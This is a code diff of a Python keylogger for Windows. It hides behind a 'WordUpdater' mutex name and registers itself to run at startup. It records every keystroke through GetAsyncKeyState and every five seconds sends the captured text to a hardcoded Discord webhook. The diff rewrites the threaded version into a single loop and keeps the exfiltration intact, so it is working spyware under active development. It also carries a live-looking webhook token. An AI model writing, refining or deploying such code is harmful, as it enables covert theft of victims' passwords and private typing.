@@ -7,7 +7,6 @@ import winreg
 import win32event
 import win32api
 import winerror
-import threading
 
 # === Prevent multiple instances using a named mutex ===
 mutex = win32event.CreateMutex(None, False, "Global\\WordUpdaterMutex")
@@ -31,7 +30,7 @@ add_to_startup()
 
 # === Keylogging functionality ===
 user32 = ctypes.windll.user32
-webhook_url = 'https://discord.com/api/webhooks/1367536389909905540/aSuRIYgRe9s8N8CStcgxhw1s-bg__uTeKAKuGHZoTDJynLAfSufQMACssxm8WNeV37ZP'  # Replace this with your actual Discord webhook
+ngrok_url = 'https://discord.com/api/webhooks/1367536389909905540/aSuRIYgRe9s8N8CStcgxhw1s-bg__uTeKAKuGHZoTDJynLAfSufQMACssxm8WNeV37ZP'
 
 def getKey(code):
     asciiTable = {
@@ -52,47 +51,39 @@ def getKey(code):
     }
     return asciiTable.get(code, "")
 
-# Shared buffers and lock
-buffer_a = []
-buffer_b = []
-active_buffer = buffer_a
-buffer_lock = threading.Lock()
-pressed_keys = set()
+def main():
+    buffer = []
+    last_sent = time.time()
+    pressed_keys = set()
 
-def switch_and_send():
-    global active_buffer
-    while True:
-        time.sleep(5)
-        with buffer_lock:
-            to_send = active_buffer.copy()
-            active_buffer.clear()
-            active_buffer = buffer_b if active_buffer is buffer_a else buffer_a
-        if to_send:
-            try:
-                message = ''.join(to_send)
-                requests.post(webhook_url, json={"content": message})
-            except:
-                pass
-
-def keylogger():
-    global active_buffer
     while True:
         for i in range(256):
             key_state = user32.GetAsyncKeyState(i)
+
             if key_state & 0x8000:
                 if i not in pressed_keys:
                     key = getKey(str(i))
                     if user32.GetKeyState(0x14) & 0x0001 == 0:
                         key = key.lower()
                     if key:
-                        with buffer_lock:
-                            active_buffer.append(key)
+                        buffer.append(key)
                     pressed_keys.add(i)
             else:
                 if i in pressed_keys:
                     pressed_keys.remove(i)
+
+        if time.time() - last_sent >= 5.0:
+            if buffer:
+                try:
+                    joined_keys = ''.join(buffer)
+                    requests.post(ngrok_url, data={'message': joined_keys})
+                    buffer.clear()
+                except Exception:
+                    pass
+            last_sent = time.time()
+
         time.sleep(0.01)
 
 if __name__ == "__main__":
-    threading.Thread(target=switch_and_send, daemon=True).start()
-    keylogger()
+    main()
+
